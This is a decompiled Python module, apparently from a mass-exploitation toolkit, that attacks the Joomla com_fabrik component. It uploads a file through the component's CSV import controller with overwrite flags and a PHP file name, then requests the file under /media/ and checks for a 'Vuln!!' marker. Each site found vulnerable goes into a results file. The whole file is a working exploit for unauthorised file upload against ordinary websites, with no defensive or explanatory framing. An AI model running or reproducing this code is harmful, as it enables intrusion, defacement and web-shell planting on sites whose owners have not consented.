# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Com_Fabric.py
import requests
from Exploits import printModule
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
TextindeX = 'files/vuln.txt'

def Exploit(site):
    try:
        fileindex = {'userfile': (TextindeX, open(TextindeX, 'rb'), 'multipart/form-data')}
        post_data = {'name': 'me.php',
           'drop_data': '1',
           'overwrite': '1',
           'field_delimiter': ',',
           'text_delimiter': '&quot;',
           'option': 'com_fabrik',
           'controller': 'import',
           'view': 'import',
           'task': 'doimport',
           'Itemid': '0',
           'tableid': '0'
           }
        Exp = 'http://' + site + '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table='
        requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        Check = requests.get('http://' + site + '/media/' + TextindeX.split('/')[1], headers=Headers, timeout=10)
        if 'Vuln!!' in str(Check.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/media/' + TextindeX.split('/')[1] + '\n')
            return printModule.returnYes(site, 'N/A', 'Com_Fabric', 'Joomla')
        return printModule.returnNo(site, 'N/A', 'Com_Fabric', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_Fabric', 'Joomla')